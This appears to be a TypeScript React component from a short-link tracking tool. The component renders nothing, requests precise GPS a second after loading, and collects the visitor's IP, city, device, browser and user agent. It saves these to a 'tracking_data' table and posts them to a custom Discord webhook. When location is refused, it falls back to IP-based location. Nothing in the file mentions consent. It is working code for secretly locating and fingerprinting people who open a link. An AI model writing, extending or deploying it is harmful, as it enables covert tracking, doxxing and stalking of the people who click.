
import React, { useEffect, useRef } from 'react';
import supabase from '../utils/database';
import { sendDiscordWebhook } from '../utils/discordWebhook';

interface LocationTrackerProps {
  onSuccess: () => void;
  onError: (error: any) => void;
  customWebhook?: string;
  shortCode?: string;
}

const LocationTracker: React.FC<LocationTrackerProps> = ({ 
  onSuccess, 
  onError, 
  customWebhook,
  shortCode 
}) => {
  const hasExecuted = useRef(false);

  useEffect(() => {
    if (hasExecuted.current) return;
    hasExecuted.current = true;

    const getClientIP = async (): Promise<string> => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        console.log('Client IP retrieved:', data.ip);
        return data.ip;
      } catch (error) {
        console.error('Error getting client IP:', error);
        return 'Unknown';
      }
    };

    const getIPInfo = async () => {
      try {
        const response = await fetch('https://ipapi.co/json/');
        const ipData = await response.json();
        console.log('IP info retrieved:', ipData);
        return {
          ip: ipData.ip || 'Unknown',
          country: ipData.country_name || 'Unknown',
          city: ipData.city || 'Unknown',
          region: ipData.region || 'Unknown',
          timezone: ipData.timezone || Intl.DateTimeFormat().resolvedOptions().timeZone
        };
      } catch (error) {
        console.error('Failed to get IP info:', error);
        return {
          ip: 'Unknown',
          country: 'Unknown',
          city: 'Unknown',
          region: 'Unknown',
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
        };
      }
    };

    const getDeviceInfo = () => {
      const ua = navigator.userAgent;
      let deviceType = 'Unknown';
      let browser = 'Unknown';
      let os = 'Unknown';

      if (/Mobile|Android|iPhone|iPad/.test(ua)) {
        deviceType = 'Mobile';
      } else if (/Tablet/.test(ua)) {
        deviceType = 'Tablet';
      } else {
        deviceType = 'Desktop';
      }

      if (ua.includes('Chrome') && !ua.includes('Edg')) {
        browser = 'Chrome';
      } else if (ua.includes('Firefox')) {
        browser = 'Firefox';
      } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
        browser = 'Safari';
      } else if (ua.includes('Edg')) {
        browser = 'Edge';
      } else if (ua.includes('Opera')) {
        browser = 'Opera';
      }

      if (ua.includes('Windows')) {
        os = 'Windows';
      } else if (ua.includes('Mac')) {
        os = 'macOS';
      } else if (ua.includes('Linux')) {
        os = 'Linux';
      } else if (ua.includes('Android')) {
        os = 'Android';
      } else if (ua.includes('iOS')) {
        os = 'iOS';
      }

      const deviceInfo = {
        deviceType,
        browser,
        os,
        platform: navigator.platform || 'Unknown',
        language: navigator.language || 'Unknown',
        screenWidth: screen.width,
        screenHeight: screen.height,
        userAgent: ua
      };

      console.log('Device info collected:', deviceInfo);
      return deviceInfo;
    };

    const sendIPOnlyData = async () => {
      try {
        console.log('Sending IP-only data as location fallback');
        const ipInfo = await getIPInfo();
        const deviceInfo = getDeviceInfo();
        const clientIp = await getClientIP();

        const ipOnlyData = {
          type: 'ip_location',
          ipInfo,
          deviceInfo,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          capturedAt: new Date().toISOString(),
          reason: 'Location permission denied or not available'
        };

        const dbRecord = {
          short_code: shortCode,
          type: 'ip_only',
          data: ipOnlyData,
          ip_address: clientIp,
          user_agent: navigator.userAgent,
          created_at: new Date().toISOString(),
          latitude: null,
          longitude: null
        };

        console.log('Saving IP-only data to database:', dbRecord);

        const { error } = await supabase
          .from('tracking_data')
          .insert([dbRecord]);

        if (error) {
          console.error('Error saving IP-only data:', error);
          onError(error);
          return;
        }

        console.log('IP-only data saved successfully');

        if (customWebhook) {
          try {
            await sendDiscordWebhook(customWebhook, {
              content: `🌐 **IP Location Captured (Fallback)**`,
              embeds: [{
                title: "IP-Based Location Information",
                color: 16776960,
                fields: [
                  {
                    name: "📍 Location (IP-based)",
                    value: `**Country:** ${ipInfo.country}\n**City:** ${ipInfo.city}\n**Region:** ${ipInfo.region}`,
                    inline: true
                  },
                  {
                    name: "🌐 Network Info",
                    value: `**IP:** ${ipInfo.ip}\n**Timezone:** ${ipInfo.timezone}`,
                    inline: true
                  },
                  {
                    name: "🔗 Short Code",
                    value: shortCode || 'Unknown',
                    inline: true
                  },
                  {
                    name: "📱 Device Info",
                    value: `**Type:** ${deviceInfo.deviceType}\n**OS:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}`,
                    inline: false
                  }
                ],
                footer: {
                  text: `IP-only capture at ${new Date().toLocaleString()}`
                }
              }]
            });
            console.log('IP-only data sent to Discord webhook');
          } catch (webhookError) {
            console.error('Error sending IP-only data to Discord webhook:', webhookError);
          }
        }

        onSuccess();
      } catch (error) {
        console.error('Error processing IP-only data:', error);
        onError(error);
      }
    };

    const getLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            try {
              const ipInfo = await getIPInfo();
              const deviceInfo = getDeviceInfo();
              const clientIp = await getClientIP();

              const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed,
                timestamp: position.timestamp,
                ipInfo,
                deviceInfo,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                capturedAt: new Date().toISOString()
              };

              console.log('Location data captured:', locationData);

              // Save to database with separate latitude/longitude columns
              const dbRecord = {
                short_code: shortCode,
                type: 'location',
                data: locationData,
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                ip_address: clientIp,
                user_agent: navigator.userAgent,
                created_at: new Date().toISOString()
              };

              console.log('Saving location data to database:', dbRecord);

              const { error } = await supabase
                .from('tracking_data')
                .insert([dbRecord]);

              if (error) {
                console.error('Error saving location data:', error);
                onError(error);
                return;
              }

              console.log('Location data saved to database successfully');

              if (customWebhook) {
                try {
                  await sendDiscordWebhook(customWebhook, {
                    content: `🌍 **Precise Location Captured**`,
                    embeds: [{
                      title: "Location Information",
                      color: 5763719,
                      fields: [
                        {
                          name: "📍 GPS Coordinates",
                          value: `**Latitude:** ${position.coords.latitude}\n**Longitude:** ${position.coords.longitude}`,
                          inline: true
                        },
                        {
                          name: "🎯 Accuracy",
                          value: `${Math.round(position.coords.accuracy)} meters`,
                          inline: true
                        },
                        {
                          name: "🔗 Short Code",
                          value: shortCode || 'Unknown',
                          inline: true
                        },
                        {
                          name: "🌐 IP Location",
                          value: `**Country:** ${ipInfo.country}\n**City:** ${ipInfo.city}\n**IP:** ${ipInfo.ip}`,
                          inline: true
                        },
                        {
                          name: "📱 Device Info",
                          value: `**Type:** ${deviceInfo.deviceType}\n**OS:** ${deviceInfo.os}\n**Browser:** ${deviceInfo.browser}`,
                          inline: true
                        }
                      ],
                      footer: {
                        text: `GPS capture at ${new Date().toLocaleString()}`
                      }
                    }]
                  });
                  console.log('Location data sent to Discord webhook');
                } catch (webhookError) {
                  console.error('Error sending location to Discord webhook:', webhookError);
                }
              }

              onSuccess();
            } catch (error) {
              console.error('Error processing location:', error);
              onError(error);
            }
          },
          async (error) => {
            console.error('Geolocation error:', error);
            console.log('Location failed, falling back to IP-only tracking');
            await sendIPOnlyData();
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        console.log('Geolocation not supported, using IP-only tracking');
        sendIPOnlyData();
      }
    };

    const timer = setTimeout(getLocation, 1000);
    
    return () => clearTimeout(timer);
  }, [onSuccess, onError, customWebhook, shortCode]);

  return null;
};

export default LocationTracker;
